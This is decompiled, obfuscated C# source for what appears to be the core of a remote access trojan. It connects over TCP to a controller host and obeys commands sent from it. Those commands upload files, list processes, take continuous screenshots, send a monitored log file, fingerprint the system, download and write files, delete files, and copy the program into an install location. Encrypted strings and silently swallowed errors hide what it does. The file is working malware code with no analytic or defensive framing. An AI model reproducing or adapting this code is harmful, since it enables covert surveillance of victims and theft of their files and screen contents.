using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ns1;
using ns2;
using ns4;
using ns6;
using ns8;

namespace ns3;

internal sealed class Class2
{
	private delegate void Delegate0(Form0 form);

	[CompilerGenerated]
	private sealed class Class3
	{
		public string[] string_0;

		public Class2 class2_0;

		internal void method_0()
		{
			class2_0.method_3(string_0[1]);
		}

		internal void method_1()
		{
			class2_0.class1_0.method_0(string_0[1]);
		}

		internal void method_2()
		{
			class2_0.method_8(string_0[1]);
		}

		internal void method_3()
		{
			class2_0.method_14(string_0[1]);
		}

		internal void method_4()
		{
			class2_0.method_13(string_0[1].Split(new char[1] { '|' })[0], int.Parse(string_0[1].Split(new char[1] { '|' })[1]));
		}

		internal void method_5()
		{
			class2_0.method_24(string_0[1]);
		}

		internal void method_6()
		{
			class2_0.class7_0.method_2(string_0[1]);
		}
	}

	[CompilerGenerated]
	private sealed class Class4
	{
		public string string_0;

		public Class3 class3_0;

		[NonSerialized]
		internal static GetString getString_0;

		internal void method_0()
		{
			class3_0.class2_0.method_1(null, getString_0(107395434).Split(new char[1] { '|' })[0] + string_0);
		}

		static Class4()
		{
			Strings.CreateGetStringDelegate(typeof(Class4));
		}
	}

	[CompilerGenerated]
	private sealed class Class5
	{
		public string string_0;

		public Class3 class3_0;

		[NonSerialized]
		internal static GetString getString_0;

		internal void method_0()
		{
			class3_0.class2_0.method_1(null, getString_0(107395408).Split(new char[1] { '!' })[0] + string_0);
		}

		static Class5()
		{
			Strings.CreateGetStringDelegate(typeof(Class5));
		}
	}

	private bool bool_0 = false;

	private Class7 class7_0 = new Class7();

	public DateTime dateTime_0;

	private int int_0 = 0;

	private int int_1 = 1024;

	public Class1 class1_0;

	public bool bool_1 = false;

	private Class6 class6_0 = new Class6();

	public ProcessStartInfo processStartInfo_0;

	private bool bool_2 = false;

	private bool bool_3 = false;

	private bool bool_4 = false;

	public int int_2 = 0;

	private bool bool_5 = false;

	private int int_3 = 0;

	public Process process_0;

	private Dictionary<string, byte[]> dictionary_0 = new Dictionary<string, byte[]>();

	private Thread thread_0;

	public TcpClient tcpClient_0;

	private int int_4 = 0;

	public NetworkStream networkStream_0;

	private bool bool_6 = false;

	public bool bool_7 = false;

	public bool bool_8 = false;

	private ThreadStart threadStart_0;

	private int int_5 = 210;

	[NonSerialized]
	internal static GetString getString_0;

	private void method_0()
	{
		try
		{
			if (!File.Exists(Class11.smethod_8() + Class11.string_5 + getString_0(107396384).Split(new char[1] { '|' })[0]))
			{
				return;
			}
			class1_0.method_15(Class11.smethod_8() + Class11.string_5 + getString_0(107396384).Split(new char[1] { '|' })[0]);
			int num = 0;
			while (true)
			{
				if (num < 10)
				{
					if (File.Exists(Class11.smethod_8() + Class11.string_5))
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			byte[] byte_ = File.ReadAllBytes(Class11.smethod_8() + Class11.string_5);
			method_1(byte_, getString_0(107396335).Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public bool method_1(byte[] byte_0, string string_0, bool bool_9 = false)
	{
		try
		{
			class1_0.dateTime_0 = DateTime.Now;
			if (bool_4)
			{
				return false;
			}
			bool_4 = true;
			byte[] array = Class11.smethod_1(string_0);
			int num = 0;
			int num2 = 5;
			byte[] array2 = null;
			if (byte_0 != null)
			{
				array2 = BitConverter.GetBytes(byte_0.Length);
				num = byte_0.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(array.Length);
			byte[] array3 = new byte[num2 + array.Length + num];
			bytes.CopyTo(array3, 0);
			array.CopyTo(array3, 5);
			if (byte_0 != null)
			{
				array2.CopyTo(array3, 5 + array.Length);
				byte_0.CopyTo(array3, 10 + array.Length);
			}
			int num3 = 0;
			int num4 = array3.Length;
			while (num4 > 0 && !bool_1)
			{
				int num5 = ((num4 > int_1) ? int_1 : num4);
				networkStream_0.Write(array3, num3, num5);
				num3 += num5;
				num4 -= num5;
				class1_0.dateTime_0 = DateTime.Now;
			}
			bool_4 = false;
			if (bool_1)
			{
				return false;
			}
			return true;
		}
		catch
		{
			bool_4 = false;
			bool_7 = false;
			return false;
		}
	}

	private void method_2()
	{
		string text = Class11.smethod_4();
		string text2 = Class11.string_13 + getString_0(107396302) + Class11.string_11 + getString_0(107396302) + Class11.string_12 + getString_0(107396302) + Class11.string_14 + getString_0(107396302) + Class11.smethod_10() + getString_0(107396302) + Class11.string_10 + getString_0(107396302) + text;
		text2 += getString_0(107396297);
		text2 = text2 + getString_0(107396302) + Class11.smethod_2() + getString_0(107396302) + Class11.string_8;
		byte[] byte_ = Class11.smethod_1(text2);
		method_1(byte_, getString_0(107396292).Split(new char[1] { '|' })[0]);
		if (!bool_5 && Directory.Exists(Class11.smethod_5() + Class11.string_3))
		{
			bool_5 = true;
		}
		if (bool_5)
		{
			method_1(null, getString_0(107396259) + Class11.smethod_5() + Class11.string_3);
		}
		if (File.Exists(Class11.smethod_5() + Class11.string_4))
		{
			method_1(null, getString_0(107396238).Split(new char[1] { '!' })[0] + Class11.smethod_5() + Class11.string_3);
		}
		if (bool_6)
		{
			method_1(null, getString_0(107396205).Split(new char[1] { '!' })[0]);
		}
	}

	private void method_3(string string_0)
	{
		try
		{
			if (File.Exists(string_0))
			{
				string fileName = Path.GetFileName(string_0);
				method_1(File.ReadAllBytes(string_0), getString_0(107396176).Split(new char[1] { '!' })[0] + string_0 + getString_0(107396179) + fileName, bool_9: true);
			}
		}
		catch
		{
		}
	}

	public string[] method_4()
	{
		try
		{
			byte[] array = new byte[5];
			int_4 = networkStream_0.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= int_4)
			{
				int count = ((num3 > int_1) ? int_1 : num3);
				int_4 = networkStream_0.Read(array2, num2, count);
				num2 += int_4;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == getString_0(107396645))
			{
				return null;
			}
			return text.ToLower().Split(new char[1] { '=' });
		}
		catch
		{
			bool_7 = false;
			return null;
		}
	}

	public void method_5()
	{
		try
		{
			string text = getString_0(107396645);
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + getString_0(107396687).Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName.ToString() + getString_0(107396142).Split(new char[1] { '!' })[0];
				text += getString_0(107396161).Split(new char[1] { '|' })[0];
				text += getString_0(107396148).Split(new char[1] { '!' })[0];
			}
			byte[] byte_ = Class11.smethod_1(text);
			method_1(byte_, getString_0(107396615).Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void method_6(string string_0)
	{
		try
		{
			byte[] array = method_16();
			if (array != null)
			{
				File.WriteAllBytes(string_0, array);
			}
		}
		catch
		{
		}
	}

	private bool method_7()
	{
		try
		{
			Class11.string_16 = class1_0.method_11()[0];
			if (int_3 > 21)
			{
				Class11.string_16 = class1_0.method_11()[1];
				if (int_3 > 26)
				{
					int_3 = 0;
				}
			}
			int_3++;
			tcpClient_0 = new TcpClient();
			tcpClient_0.Connect(Class11.string_16, Class11.int_0);
			int_3 = 0;
			return true;
		}
		catch
		{
			method_9();
			return false;
		}
	}

	public bool method_8(string string_0)
	{
		try
		{
			string[] array = string_0.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] byte_ = File.ReadAllBytes(path);
				string_0 = string_0 + getString_0(107396582) + fileName;
				method_1(byte_, getString_0(107396609).Split(new char[1] { '!' })[0] + string_0);
				return false;
			}
			method_1(null, getString_0(107396548) + string_0);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void method_9()
	{
		int_2++;
		Class11.int_0 = Class11.int_1[int_2];
		if (int_2 >= Class11.int_1.Length - 1)
		{
			int_2 = 0;
		}
	}

	public void method_10()
	{
		try
		{
			string text = Class11.smethod_2() + Class11.string_8 + getString_0(107396384).Split(new char[1] { '|' })[0];
			Class11.smethod_9(getString_0(107396527).Split(new char[1] { '|' })[0], Class11.smethod_2() + Class11.string_8 + getString_0(107396384).Split(new char[1] { '|' })[0]);
			if (text != Class11.string_1)
			{
				Thread.Sleep(20);
				File.WriteAllBytes(Class11.smethod_2() + Class11.string_8 + getString_0(107396384).Split(new char[1] { '|' })[0], File.ReadAllBytes(Class11.string_1));
			}
		}
		catch
		{
		}
	}

	private void method_11(object object_0)
	{
		try
		{
			if (!bool_0)
			{
				bool_0 = true;
				class1_0.method_8();
				if (!bool_7 || !tcpClient_0.Connected)
				{
					bool_7 = method_7();
					if (bool_7)
					{
						int_1 = tcpClient_0.ReceiveBufferSize;
						if (thread_0 != null && thread_0.IsAlive)
						{
							thread_0.Abort();
						}
						class7_0.string_0 = Class11.smethod_2();
						if (!bool_5 && Directory.Exists(Class11.smethod_5() + getString_0(107396538).Split(new char[1] { '!' })[0]))
						{
							bool_5 = true;
						}
						method_22();
					}
				}
			}
			else
			{
				int_0++;
			}
			bool_0 = false;
		}
		catch
		{
			int_3++;
			bool_0 = false;
			int_0 = 0;
			bool_4 = false;
			bool_7 = false;
			bool_3 = false;
		}
	}

	public void method_12()
	{
		Class11.int_0 = Class11.int_1[0];
		class1_0 = new Class1(this);
		class1_0.dateTime_0 = DateTime.Now;
		Class11.smethod_3();
		class7_0.class2_0 = this;
		TimerCallback callback = method_11;
		Timer timer_ = new Timer(callback, class6_0, 35000, 45000);
		class6_0.timer_0 = timer_;
		class1_0.method_5();
		Thread.Sleep(200);
		class1_0.method_2();
	}

	public bool method_13(string string_0, int int_6)
	{
		bool result = false;
		try
		{
			List<string> list = new List<string>();
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read);
			int num = (int)Math.Ceiling((double)fileStream.Length / (double)int_6);
			string text = Path.GetDirectoryName(string_0) + getString_0(107396489).Replace(getString_0(107396508).Split(new char[1] { '!' })[0], getString_0(107396463).Split(new char[1] { '!' })[0]);
			if (!Directory.Exists(text))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(text);
				directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			}
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(string_0);
			string extension = Path.GetExtension(string_0);
			for (int i = 0; i < int_6; i++)
			{
				FileStream fileStream2 = new FileStream(text + getString_0(107396463).Split(new char[1] { '!' })[0] + fileNameWithoutExtension + getString_0(107396450).Split(new char[1] { '!' })[0] + i.ToString().PadLeft(5, Convert.ToChar(getString_0(107397072))) + extension + getString_0(107396469).Split(new char[1] { '!' })[0], FileMode.Create, FileAccess.Write);
				int num2 = 0;
				byte[] buffer = new byte[num];
				if ((num2 = fileStream.Read(buffer, 0, num)) > 0)
				{
					fileStream2.Write(buffer, 0, num2);
					string item = fileNameWithoutExtension + getString_0(107396420) + i.ToString().PadLeft(3, Convert.ToChar(getString_0(107397072))) + extension.ToString();
					list.Add(item);
				}
				fileStream2.Close();
			}
			fileStream.Close();
			return result;
		}
		catch
		{
			return result;
		}
	}

	private void method_14(string string_0)
	{
		try
		{
			Class10 @class = new Class10();
			int_5 = Convert.ToInt16(string_0.Split(new char[1] { '>' })[0].Trim());
			while (bool_2 && bool_7)
			{
				Bitmap val = @class.method_0(int_5);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					method_1(memoryStream.ToArray(), getString_0(107396447).Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void method_15(string string_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(string_0);
			Bitmap val2 = new Bitmap((Image)(object)val, 210, 160);
			if (val2 != null)
			{
				FileInfo fileInfo = new FileInfo(string_0);
				string text = fileInfo.Name + getString_0(107396142).Split(new char[1] { '!' })[0];
				text = text + fileInfo.CreationTimeUtc.ToString() + getString_0(107396142).Split(new char[1] { '!' })[0];
				text = text + class1_0.method_4(fileInfo.Length) + getString_0(107396142).Split(new char[1] { '!' })[0];
				MemoryStream memoryStream = new MemoryStream();
				((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Png());
				method_1(memoryStream.ToArray(), getString_0(107396410).Split(new char[1] { '!' })[0] + text);
			}
		}
		catch
		{
		}
	}

	public byte[] method_16()
	{
		try
		{
			class1_0.dateTime_0 = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			int_4 = networkStream_0.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !bool_1)
			{
				int count = ((num3 > int_1) ? int_1 : num3);
				int_4 = networkStream_0.Read(array2, num, count);
				num += int_4;
				num3 -= int_4;
				class1_0.dateTime_0 = DateTime.Now;
			}
			if (bool_1)
			{
				networkStream_0.Flush();
				array2 = null;
			}
			return array2;
		}
		catch
		{
			bool_7 = false;
			return null;
		}
	}

	private void method_17(string string_0)
	{
		try
		{
			Class10 @class = new Class10();
			int_5 = Convert.ToInt16(string_0.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = @class.method_0(int_5);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				method_1(memoryStream.ToArray(), getString_0(107395865).Split(new char[1] { '!' })[0]);
			}
		}
		catch
		{
		}
	}

	private void method_18(string string_0)
	{
		try
		{
			string[] array = string_0.Split(new char[1] { '>' });
			int_5 = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void method_19(string string_0)
	{
		try
		{
			if (!File.Exists(Class11.smethod_6() + Class11.string_7))
			{
				return;
			}
			string fileName = Path.GetFileName(Class11.smethod_6() + Class11.string_7);
			DateTime lastWriteTimeUtc = File.GetLastWriteTimeUtc(Class11.smethod_6() + Class11.string_7);
			string text = getString_0(107395828).Split(new char[1] { '|' })[0];
			string path = Class11.smethod_6() + Class11.string_7;
			byte[] array;
			using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
			{
				using StreamReader streamReader = new StreamReader(stream);
				array = Class11.smethod_1(streamReader.ReadToEnd());
			}
			if (string_0 == text)
			{
				if (dateTime_0.ToString() != lastWriteTimeUtc.ToString() && array.Length != 0)
				{
					method_1(array, getString_0(107395779) + string_0 + getString_0(107395798).Split(new char[1] { '!' })[0] + fileName);
				}
			}
			else if (array.Length != 0)
			{
				method_1(array, getString_0(107395779) + string_0 + getString_0(107395753).Split(new char[1] { '|' })[0] + fileName);
			}
			dateTime_0 = lastWriteTimeUtc;
		}
		catch
		{
		}
	}

	private void method_20()
	{
		try
		{
			byte[] byte_ = Class11.smethod_7();
			method_1(byte_, getString_0(107395772).Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void method_21()
	{
		string text = class7_0.method_6();
		method_1(null, getString_0(107395735).Split(new char[1] { '!' })[0] + text);
	}

	private void method_22()
	{
		if (!bool_3)
		{
			bool_3 = true;
			networkStream_0 = class1_0.method_1(tcpClient_0);
			bool_2 = false;
			while (bool_7)
			{
				string[] string_2 = method_4();
				if (string_2 != null)
				{
					bool_1 = false;
					string text = string_2[0];
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? (getString_0(107395706).Split(new char[1] { '!' })[0] + text) : (getString_0(107395706).Split(new char[1] { '!' })[0] + text.Split(new char[1] { '-' })[1]));
					string text2 = text;
					uint num = Class13.smethod_0(text2);
					if (num <= 2297366469u)
					{
						if (num <= 1403544835)
						{
							switch (num)
							{
							case 350746052u:
								if (text2 == getString_0(107395907))
								{
									method_15(string_2[1]);
								}
								break;
							case 99201981u:
								if (text2 == getString_0(107395351))
								{
									bool_2 = false;
								}
								break;
							case 649483913u:
								if (text2 == getString_0(107395994))
								{
									threadStart_0 = delegate
									{
										method_19(getString_0(107395478).Split(new char[1] { '|' })[0]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 498893312u:
								if (text2 == getString_0(107395922))
								{
									class1_0.method_5();
								}
								break;
							case 378168789u:
								if (text2 == getString_0(107395492))
								{
									class1_0.method_15(string_2[1].Split(new char[1] { '>' })[0]);
								}
								break;
							case 1070258121u:
								if (text2 == getString_0(107395336))
								{
									method_18(string_2[1]);
								}
								break;
							case 846333329u:
								if (text2 == getString_0(107396004))
								{
									processStartInfo_0 = null;
									process_0 = null;
								}
								break;
							case 759377100u:
								if (text2 == getString_0(107395668))
								{
									bool_8 = true;
									bool_1 = true;
									bool_2 = false;
								}
								break;
							case 1403544835u:
								if (text2 == getString_0(107395169))
								{
									bool_2 = true;
									threadStart_0 = delegate
									{
										method_14(string_2[1]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 1353871019u:
								if (text2 == getString_0(107396042))
								{
									method_1(null, getString_0(107395507).Split(new char[1] { '!' })[0] + Class11.smethod_2());
								}
								break;
							case 1341262361u:
								if (text2 == getString_0(107396091))
								{
									class1_0.method_7();
								}
								break;
							}
							continue;
						}
						if (num <= 2100340970)
						{
							if (num <= 1718814918)
							{
								switch (num)
								{
								case 1718814918u:
									if (text2 == getString_0(107395901))
									{
										threadStart_0 = delegate
										{
											method_20();
										};
										thread_0 = new Thread(threadStart_0);
										thread_0.Start();
									}
									break;
								case 1706335176u:
									if (text2 == getString_0(107395171))
									{
										thread_0 = new Thread(method_21);
										thread_0.Start();
									}
									break;
								case 1488721926u:
									if (text2 == getString_0(107396080))
									{
										class1_0.method_3();
									}
									break;
								}
								continue;
							}
							if (num == 1727000503)
							{
								if (text2 == getString_0(107395634))
								{
									class1_0.method_6();
								}
								continue;
							}
							if (num == 1858533126)
							{
								if (!(text2 == getString_0(107395120)))
								{
									continue;
								}
								string string_ = class7_0.method_5(string_2[1]);
								if (string_ != getString_0(107396645))
								{
									threadStart_0 = delegate
									{
										method_1(null, Class5.getString_0(107395408).Split(new char[1] { '!' })[0] + string_);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								continue;
							}
							if (num != 2100340970 || !(text2 == getString_0(107396989)))
							{
								continue;
							}
						}
						else if (num <= 2236459395u)
						{
							if (num == 2109487241)
							{
								if (text2 == getString_0(107395619))
								{
									class1_0.method_5();
								}
								continue;
							}
							if (num != 2177855104u)
							{
								if (num != 2236459395u || !(text2 == getString_0(107397037)))
								{
									continue;
								}
							}
							else if (!(text2 == getString_0(107396951)))
							{
								continue;
							}
						}
						else
						{
							if (num == 2244271268u)
							{
								if (!(text2 == getString_0(107396129)))
								{
									continue;
								}
								string string_0 = class7_0.method_0(string_2[1]);
								if (string_0 != getString_0(107396645))
								{
									threadStart_0 = delegate
									{
										method_1(null, Class4.getString_0(107395434).Split(new char[1] { '|' })[0] + string_0);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								continue;
							}
							if (num != 2277527002u)
							{
								if (num != 2297366469u || !(text2 == getString_0(107397010)))
								{
									continue;
								}
							}
							else if (!(text2 == getString_0(107396936)))
							{
								continue;
							}
						}
					}
					else if (num <= 2936041210u)
					{
						if (num > 2556465916u)
						{
							switch (num)
							{
							case 2781903778u:
								if (text2 == getString_0(107395653))
								{
									threadStart_0 = delegate
									{
										method_3(string_2[1]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 2683955727u:
								if (text2 == getString_0(107396057))
								{
									class1_0.dateTime_0 = DateTime.Now;
								}
								break;
							case 2621557245u:
								if (text2 == getString_0(107395575))
								{
									class1_0.method_14();
								}
								break;
							case 2936041210u:
								if (text2 == getString_0(107395613) && string_2[1].Split(new char[1] { '|' }).Length == 2)
								{
									threadStart_0 = delegate
									{
										method_13(string_2[1].Split(new char[1] { '|' })[0], int.Parse(string_2[1].Split(new char[1] { '|' })[1]));
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 2932646062u:
								if (text2 == getString_0(107395541))
								{
									threadStart_0 = delegate
									{
										class7_0.method_2(string_2[1]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 2817959937u:
								if (text2 == getString_0(107395220))
								{
									threadStart_0 = delegate
									{
										method_8(string_2[1]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							}
							continue;
						}
						if (num <= 2418422904u)
						{
							if (num != 2372558126u)
							{
								if (num == 2418422904u && text2 == getString_0(107395945))
								{
									threadStart_0 = delegate
									{
										method_5();
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								continue;
							}
							if (!(text2 == getString_0(107397086)))
							{
								continue;
							}
						}
						else if (num != 2498755100u)
						{
							if (num != 2499224954u)
							{
								if (num != 2556465916u || !(text2 == getString_0(107395296)))
								{
									continue;
								}
							}
							else if (!(text2 == getString_0(107396995)))
							{
								continue;
							}
						}
						else if (!(text2 == getString_0(107395302)))
						{
							continue;
						}
					}
					else if (num <= 3447021907u)
					{
						if (num <= 3093430489u)
						{
							switch (num)
							{
							case 3093430489u:
								if (text2 == getString_0(107395983))
								{
									threadStart_0 = delegate
									{
										class1_0.method_9();
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 3076544732u:
								if (text2 == getString_0(107395598))
								{
									string[] array = string_2[1].Split(new char[1] { '|' });
									class1_0.method_10(Convert.ToInt16(array[0].Trim()));
								}
								break;
							case 3018594999u:
								if (text2 == getString_0(107395560))
								{
									threadStart_0 = delegate
									{
										method_24(string_2[1]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							}
							continue;
						}
						if (num != 3212799684u)
						{
							switch (num)
							{
							case 3447021907u:
								if (text2 == getString_0(107395186))
								{
									threadStart_0 = delegate
									{
										method_0();
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							case 3295588159u:
								if (text2 == getString_0(107395960))
								{
									class1_0.method_2();
								}
								break;
							}
							continue;
						}
						if (!(text2 == getString_0(107397048)))
						{
							continue;
						}
					}
					else
					{
						if (num <= 3868449377u)
						{
							switch (num)
							{
							case 3868449377u:
								if (text2 == getString_0(107395243))
								{
									method_17(string_2[1]);
								}
								break;
							case 3865726424u:
								if (text2 == getString_0(107395205))
								{
									method_6(string_2[1]);
								}
								break;
							case 3741113102u:
								if (text2 == getString_0(107395254))
								{
									threadStart_0 = delegate
									{
										class1_0.method_0(string_2[1]);
									};
									thread_0 = new Thread(threadStart_0);
									thread_0.Start();
								}
								break;
							}
							continue;
						}
						if (num == 3967168104u)
						{
							if (text2 == getString_0(107395526))
							{
								thread_0 = new Thread(method_2);
								thread_0.Start();
							}
							continue;
						}
						if (num == 4201278804u)
						{
							if (text2 == getString_0(107395135))
							{
								method_6(string_2[1]);
							}
							continue;
						}
						if (num != 4214422073u || !(text2 == getString_0(107395317)))
						{
							continue;
						}
					}
					class1_0.method_12(text, string_2[1]);
					continue;
				}
				bool_7 = false;
				break;
			}
			bool_7 = false;
			bool_2 = false;
		}
		bool_3 = false;
	}

	private void method_23(Form0 form0_0)
	{
		try
		{
			if (((Control)form0_0).get_InvokeRequired())
			{
				Delegate0 @delegate = method_23;
				((Control)form0_0).Invoke((Delegate)@delegate, new object[1] { form0_0 });
			}
			else
			{
				((Form)form0_0).Close();
			}
		}
		catch
		{
		}
	}

	public void method_24(string string_0)
	{
		try
		{
			File.Delete(string_0);
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private void method_25()
	{
		class1_0.method_9();
	}

	[CompilerGenerated]
	private void method_26()
	{
		method_19(getString_0(107395478).Split(new char[1] { '|' })[0]);
	}

	[CompilerGenerated]
	private void method_27()
	{
		method_5();
	}

	[CompilerGenerated]
	private void method_28()
	{
		method_20();
	}

	[CompilerGenerated]
	private void method_29()
	{
		method_0();
	}

	static Class2()
	{
		Strings.CreateGetStringDelegate(typeof(Class2));
	}
}
